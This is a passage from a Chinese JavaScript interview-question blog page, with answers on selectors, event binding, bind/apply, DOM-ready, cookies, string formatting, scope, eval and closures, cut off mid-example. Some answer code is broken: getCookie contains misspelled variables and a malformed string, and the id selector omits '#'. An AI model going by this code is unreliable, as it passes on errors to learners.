class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param selector &#123;String&#125; 传入的CSS选择器。</span></span><br><span class="line"><span class="comment"> * @return &#123;Array&#125;</span></span><br><span class="line"><span class="comment"> * @param  &#123;[type]&#125; selector [description]</span></span><br><span class="line"><span class="comment"> * @return &#123;[type]&#125;          [description]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> query = <span class="function"><span class="keyword">function</span>(<span class="params">selector</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(#)?(\.)?(\w+)$/img</span>;</span><br><span class="line"><span class="keyword">var</span> regResult = reg.exec(selector);</span><br><span class="line"><span class="keyword">var</span> result = [];</span><br><span class="line"><span class="comment">//如果是id选择器</span></span><br><span class="line"><span class="keyword">if</span> (regResult[<span class="number">1</span>]) &#123;</span><br><span class="line">  <span class="keyword">if</span> (regResult[<span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.querySelector === <span class="string">"function"</span>) &#123;</span><br><span class="line">      result.push(<span class="built_in">document</span>.querySelector(regResult[<span class="number">3</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.push(<span class="built_in">document</span>.getElementById(regResult[<span class="number">3</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (regResult[<span class="number">2</span>]) &#123;<span class="comment">//如果是class选择器</span></span><br><span class="line">  <span class="keyword">if</span> (regResult[<span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.getElementsByClassName === <span class="string">'function'</span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> doms = <span class="built_in">document</span>.getElementsByClassName(regResult[<span class="number">3</span>]);</span><br><span class="line">       <span class="keyword">if</span>(doms) &#123;</span><br><span class="line">          result = converToArray(doms);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//如果不支持getElementsByClassName函数</span></span><br><span class="line">       <span class="keyword">var</span> allDoms = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"*"</span>) ;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = allDoms.length; i &lt; len; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span>(allDoms[i].className.search(<span class="keyword">new</span> <span class="built_in">RegExp</span>(regResult[<span class="number">2</span>])) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">           result.push(allDoms[i]);</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (regResult[<span class="number">3</span>]) &#123; <span class="comment">//如果是标签选择器</span></span><br><span class="line">    <span class="keyword">var</span> doms = <span class="built_in">document</span>.getElementsByTagName(regResult[<span class="number">3</span>].toLowerCase());</span><br><span class="line">    <span class="keyword">if</span>(doms) &#123;</span><br><span class="line">      result = converToArray(doms);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">converToArray</span>(<span class="params">nodes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> array = <span class="literal">null</span>;         </span><br><span class="line">  <span class="keyword">try</span>&#123;        </span><br><span class="line">    array = <span class="built_in">Array</span>.prototype.slice.call(nodes,<span class="number">0</span>);<span class="comment">//针对非IE浏览器         </span></span><br><span class="line">  &#125; <span class="keyword">catch</span>(ex) &#123;</span><br><span class="line">    array = <span class="keyword">new</span> <span class="built_in">Array</span>();         </span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">0</span> ,len = nodes.length; i &lt; len ; i++ ) &#123; </span><br><span class="line">      array.push(nodes[i])         </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;      </span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="14、请评价以下代码并给出改进意见"><a href="#14、请评价以下代码并给出改进意见" class="headerlink" title="14、请评价以下代码并给出改进意见"></a>14、请评价以下代码并给出改进意见</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.addEventListener)&#123;</span><br><span class="line">  <span class="keyword">var</span> addListener = <span class="function"><span class="keyword">function</span> (<span class="params">el, type, listener, useCapture</span>) </span>&#123;</span><br><span class="line">    el.addEventListener(type, listener, useCapture);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">document</span>.all)&#123;</span><br><span class="line">  addListener = <span class="function"><span class="keyword">function</span>(<span class="params">el, type, listener</span>) </span>&#123;</span><br><span class="line">    el.attachEvent(<span class="string">"on"</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      listener.apply(el);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>不应该在 if 和 else 语句中声明 addListener 函数，应该先声明；<br>不需要使用 window.addEventListener 或 document.all 来进行检测浏览器，应该使用能力检测；<br>由于 attachEvent 在 IE 中有 this 指向问题，所以调用它时需要处理一下</p></blockquote><p>改进如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEvent</span> (<span class="params">elem, type, handler</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(elem.addEventListener) &#123;</span><br><span class="line">    elem.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elem.attachEvent) &#123;</span><br><span class="line">      elem[<span class="string">'temp'</span> + type + handler] = handler;</span><br><span class="line">      elem[type + handler] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      elem[<span class="string">'temp'</span> + type + handler].apply(elem);</span><br><span class="line">    &#125;;</span><br><span class="line">    elem.attachEvent(<span class="string">'on'</span> + type, elem[type + handler]);　</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    elem[<span class="string">'on'</span> + type] = handler;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="15、定义一个log方法，让它可以代理-console-log-的方法。"><a href="#15、定义一个log方法，让它可以代理-console-log-的方法。" class="headerlink" title="15、定义一个log方法，让它可以代理 console.log 的方法。"></a>15、定义一个log方法，让它可以代理 console.log 的方法。</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可行的方法一：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">msg</span>)　</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(msg);</span><br><span class="line">&#125;</span><br><span class="line">log(<span class="string">"hello world!"</span>) <span class="comment">// hello world!</span></span><br><span class="line"><span class="comment">// 如果要传入多个参数呢？显然上面的方法不能满足要求，所以更好的方法是：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log.apply(<span class="built_in">console</span>, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>apply和call方法的异同。</p></blockquote><p>对于apply和call两者在作用上是相同</p><p>即是调用一个对象的一个方法，以另一个对象替换当前对象。<br>将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。</p><p>但两者在参数上有区别</p><p>对于第一个参数意义都一样，但对第二个参数： apply传入的是一个参数数组，也就是将多个参数组合成为一个数组传入，<br>而call则作为call的参数传入（从第二个参数开始）。<br>如 func.call(func1,var1,var2,var3)对应的apply写法为：func.apply(func1,[var1,var2,var3]) 。</p><h2 id="16、对作用域上下文和this的理解，看下列代码："><a href="#16、对作用域上下文和this的理解，看下列代码：" class="headerlink" title="16、对作用域上下文和this的理解，看下列代码："></a>16、对作用域上下文和this的理解，看下列代码：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> User = &#123;</span><br><span class="line">  count: <span class="number">1</span>,</span><br><span class="line">  getCount: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.count;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(User.getCount());  <span class="comment">// what?</span></span><br><span class="line"><span class="keyword">var</span> func = User.getCount;</span><br><span class="line"><span class="built_in">console</span>.log(func());  <span class="comment">// what?</span></span><br></pre></td></tr></table></figure><p>问两处console输出什么？为什么？</p><p>答案是 1 和 undefined。</p><p>func是在winodw的上下文中被执行的，所以会访问不到count属性。</p><blockquote><p>那么如何确保Uesr总是能访问到func的上下文，即正确返回1。<br>正确的方法是使用Function.prototype.bind。兼容各个浏览器完整代码如下：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.bind = <span class="built_in">Function</span>.prototype.bind || <span class="function"><span class="keyword">function</span>(<span class="params">context</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> self.apply(context, <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> func = User.getCount.bind(User);</span><br><span class="line"><span class="built_in">console</span>.log(func());</span><br></pre></td></tr></table></figure><h2 id="17、原生JS的window-onload与Jquery的-document-ready-function-有什么不同？"><a href="#17、原生JS的window-onload与Jquery的-document-ready-function-有什么不同？" class="headerlink" title="17、原生JS的window.onload与Jquery的$(document).ready(function(){})有什么不同？"></a>17、原生JS的window.onload与Jquery的$(document).ready(function(){})有什么不同？</h2><p>如何用原生JS实现Jq的ready方法？</p><blockquote><p>window.onload()方法是必须等到页面内包括图片的所有元素加载完毕后才能执行。<br>$(document).ready()是DOM结构绘制完毕后就执行，不必等到加载完毕。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 传递函数给whenReady()</span></span><br><span class="line"><span class="comment"> * 当文档解析完毕且为操作准备就绪时，函数作为document的方法调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> whenReady = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;               <span class="comment">//这个函数返回whenReady()函数</span></span><br><span class="line">  <span class="keyword">var</span> funcs = [];             <span class="comment">//当获得事件时，要运行的函数</span></span><br><span class="line">  <span class="keyword">var</span> ready = <span class="literal">false</span>;          <span class="comment">//当触发事件处理程序时,切换为true</span></span><br><span class="line">  <span class="comment">//当文档就绪时,调用事件处理程序</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">handler</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ready) <span class="keyword">return</span>;       <span class="comment">//确保事件处理程序只完整运行一次</span></span><br><span class="line">    <span class="comment">//如果发生onreadystatechange事件，但其状态不是complete的话,那么文档尚未准备好</span></span><br><span class="line">    <span class="keyword">if</span> (e.type === <span class="string">'onreadystatechange'</span> &amp;&amp; <span class="built_in">document</span>.readyState !== <span class="string">'complete'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//运行所有注册函数</span></span><br><span class="line">    <span class="comment">//注意每次都要计算funcs.length</span></span><br><span class="line">    <span class="comment">//以防这些函数的调用可能会导致注册更多的函数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; funcs.length; i++) &#123;</span><br><span class="line">      funcs[i].call(<span class="built_in">document</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//事件处理函数完整执行,切换ready状态, 并移除所有函数</span></span><br><span class="line">    ready = <span class="literal">true</span>;</span><br><span class="line">    funcs = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//为接收到的任何事件注册处理程序</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">document</span>.addEventListener) &#123;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, handler, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'readystatechange'</span>, handler, <span class="literal">false</span>); <span class="comment">//IE9+</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'load'</span>, handler, <span class="literal">false</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">document</span>.attachEvent) &#123;</span><br><span class="line">    <span class="built_in">document</span>.attachEvent(<span class="string">'onreadystatechange'</span>, handler);</span><br><span class="line">    <span class="built_in">window</span>.attachEvent(<span class="string">'onload'</span>, handler);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//返回whenReady()函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">whenReady</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ready) &#123; fn.call(<span class="built_in">document</span>); &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; funcs.push(fn); &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// 如果上述代码十分难懂，下面这个简化版：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ready</span>(<span class="params">fn</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">document</span>.addEventListener) &#123;<span class="comment">//标准浏览器</span></span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="comment">//注销事件, 避免反复触发</span></span><br><span class="line">      <span class="built_in">document</span>.removeEventListener(<span class="string">'DOMContentLoaded'</span>,<span class="built_in">arguments</span>.callee, <span class="literal">false</span>);</span><br><span class="line">      fn();<span class="comment">//执行函数</span></span><br><span class="line">    &#125;, <span class="literal">false</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">document</span>.attachEvent) &#123;<span class="comment">//IE</span></span><br><span class="line">    <span class="built_in">document</span>.attachEvent(<span class="string">'onreadystatechange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">document</span>.readyState == <span class="string">'complete'</span>) &#123;</span><br><span class="line">        <span class="built_in">document</span>.detachEvent(<span class="string">'onreadystatechange'</span>, <span class="built_in">arguments</span>.callee);</span><br><span class="line">        fn();<span class="comment">//函数执行</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）"><a href="#18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）" class="headerlink" title="18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）"></a>18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）</h2><blockquote><p>给需要拖拽的节点绑定mousedown, mousemove, mouseup事件<br>mousedown事件触发后，开始拖拽<br>mousemove时，需要通过event.clientX和clientY获取拖拽位置，并实时更新位置<br>mouseup时，拖拽结束<br>需要注意浏览器边界的情况</p></blockquote><h2 id="19、请实现如下功能"><a href="#19、请实现如下功能" class="headerlink" title="19、请实现如下功能"></a>19、请实现如下功能</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setcookie</span>(<span class="params">name,value,days</span>)</span>&#123;  <span class="comment">//给cookie增加一个时间变量</span></span><br><span class="line">  <span class="keyword">var</span> exp = <span class="keyword">new</span> <span class="built_in">Date</span>(); </span><br><span class="line">  exp.setTime(exp.getTime() + days*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>); <span class="comment">//设置过期时间为days天</span></span><br><span class="line">  <span class="built_in">document</span>.cookie = name + <span class="string">" = "</span>+ <span class="built_in">escape</span> (value) + <span class="string">"; expires = "</span> + exp.toGMTString(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">var</span> myCookie = <span class="string">""</span> + <span class="built_in">document</span>.cookie + <span class="string">";"</span>; </span><br><span class="line">  <span class="keyword">var</span> searchName = <span class="string">"+ name + "</span>= <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">var</span> startOfCookie = myCookie.indexOf(searchName);</span><br><span class="line">  <span class="keyword">var</span> endOfCookie;</span><br><span class="line">  <span class="keyword">if</span>(satrtOfCookie != <span class="number">-1</span>)&#123;</span><br><span class="line">    startOfcookie += searchName.length;</span><br><span class="line">    endOfCookie = myCookie.indexOf(<span class="string">";"</span>,startOfCookie);</span><br><span class="line">    result = (myCookie.substring(startOfCookie,endOfCookie));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> oTips = <span class="built_in">document</span>.getElementById(<span class="string">'tips'</span>);<span class="comment">//假设tips的id为tips</span></span><br><span class="line">  <span class="keyword">var</span> page = &#123;</span><br><span class="line">    check: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="comment">//检查tips的cookie是否存在并且允许显示</span></span><br><span class="line">      <span class="keyword">var</span> tips = getCookie(<span class="string">'tips'</span>);</span><br><span class="line">      <span class="keyword">if</span>(!tips || tips == <span class="string">'show'</span>) <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//tips的cookie不存在</span></span><br><span class="line">      <span class="keyword">if</span>(tips == <span class="string">"never_show_again"</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    hideTip: <span class="function"><span class="keyword">function</span>(<span class="params">bNever</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(bNever) setcookie(<span class="string">'tips'</span>, <span class="string">'never_show_again'</span>, <span class="number">365</span>);</span><br><span class="line">      oTips.style.display = <span class="string">"none"</span>;<span class="comment">//隐藏</span></span><br><span class="line">　　&#125;,</span><br><span class="line">    showTip: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      oTips.style.display = <span class="string">"inline"</span>;<span class="comment">//显示，假设tips为行级元素</span></span><br><span class="line">    &#125;,</span><br><span class="line">    init: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.check()) &#123;</span><br><span class="line">        _this.showTip();</span><br><span class="line">        setcookie(<span class="string">'tips'</span>, <span class="string">'show'</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      oTips.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      _this.hideTip(<span class="literal">true</span>);</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  page.init();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="20、说出以下函数的作用是？空白区域应该填写什么？"><a href="#20、说出以下函数的作用是？空白区域应该填写什么？" class="headerlink" title="20、说出以下函数的作用是？空白区域应该填写什么？"></a>20、说出以下函数的作用是？空白区域应该填写什么？</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//define </span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.str=str;</span><br><span class="line">  &#125;</span><br><span class="line">  fn.prototype.format = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arg = ______;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.str.replace(_____,<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> arg[b]||<span class="string">""</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">window</span>.fn = fn;</span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br><span class="line"><span class="comment">//use</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> t = <span class="keyword">new</span> fn(<span class="string">'&lt;p&gt;&lt;a href="&#123;0&#125;"&gt;&#123;1&#125;&lt;/a&gt;&lt;span&gt;&#123;2&#125;&lt;/span&gt;&lt;/p&gt;'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(t.format(<span class="string">'http://www.alibaba.com'</span>,<span class="string">'Alibaba'</span>,<span class="string">'Welcome'</span>));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><blockquote><p>访函数的作用是使用format函数将函数的参数替换掉{0}这样的内容，返回一个格式化后的结果：</p></blockquote><p>第一个空是：arguments<br>第二个空是：<code>/\{(\d+)\}/ig</code></p><h2 id="21、Javascript作用链域"><a href="#21、Javascript作用链域" class="headerlink" title="21、Javascript作用链域"></a>21、Javascript作用链域</h2><p>理解变量和函数的访问范围和生命周期，全局作用域与局部作用域的区别，JavaScript中没有块作用域，函数的嵌套形成不同层次的作用域，嵌套的层次形成链式形式，通过作用域链查找属性的规则需要深入理解。</p><h2 id="22、This对象"><a href="#22、This对象" class="headerlink" title="22、This对象"></a>22、This对象</h2><p>理解不同形式的函数调用方式下的this指向，理解事件函数、定时函数中的this指向，函数的调用形式决定了this的指向。</p><blockquote><p>在JavaScript中，this通常指向的是我们正在执行的函数本身，或者是，指向该函数所属的对象。<br>全局的this → 指向的是Window<br>函数中的this → 指向的是函数所在的对象<br>对象中的this → 指向其本身</p></blockquote><h2 id="23、-eval"><a href="#23、-eval" class="headerlink" title="23、 eval"></a>23、 eval</h2><p>它的功能是把对应的字符串解析成JS代码并运行；应该避免使用eval，不安全，非常耗性能</p><p>2个步骤:</p><p>一次解析成js语句<br>一次执行</p><h2 id="24、关于事件，IE与火狐的事件机制有什么区别？-如何阻止冒泡？"><a href="#24、关于事件，IE与火狐的事件机制有什么区别？-如何阻止冒泡？" class="headerlink" title="24、关于事件，IE与火狐的事件机制有什么区别？ 如何阻止冒泡？"></a>24、关于事件，IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</h2><p>[1].在IE中,事件对象是作为一个全局变量来保存和维护的.所有的浏览器事件,不管是用户触发的，还是其他事件,都会更新window.event对象.所以在代码中，只要调用window.event就可以获取事件对象， 再event.srcElement就可以取得触发事件的元素进行进一步处理.<br>[2].在FireFox中，事件对象却不是全局对象，一般情况下，是现场发生，现场使用，FireFox把事件对象自动传给事件处理程序.</p><h2 id="25、什么是闭包（closure），为什么要用它？"><a href="#25、什么是闭包（closure），为什么要用它？" class="headerlink" title="25、什么是闭包（closure），为什么要用它？"></a>25、什么是闭包（closure），为什么要用它？</h2><blockquote><p>简单的理解是函数的嵌套形成闭包，闭包包括函数本身已经它的外部作用域<br>使用闭包可以形成独立的空间，延长变量的生命周期，报存中间状态值</p></blockquote><p>执行say667()后,say667()闭包内部变量会存在, 而闭包内部函数的内部变量不会存在.使得Javascript的垃圾回收机制GC不会收回say667()所占用的资源，因为say667()的内部函数的执行需要依赖say667()中的变量。这是对闭包作用的非常直白的描述.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say667</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Local variable that ends up within closure</span></span><br><span class="line">  <span class="keyword">var</span> num = <span class="number">666</span>;</span><br><span class="line">  <span class="keyword">var</span> sayAlert = <span class="function"><span 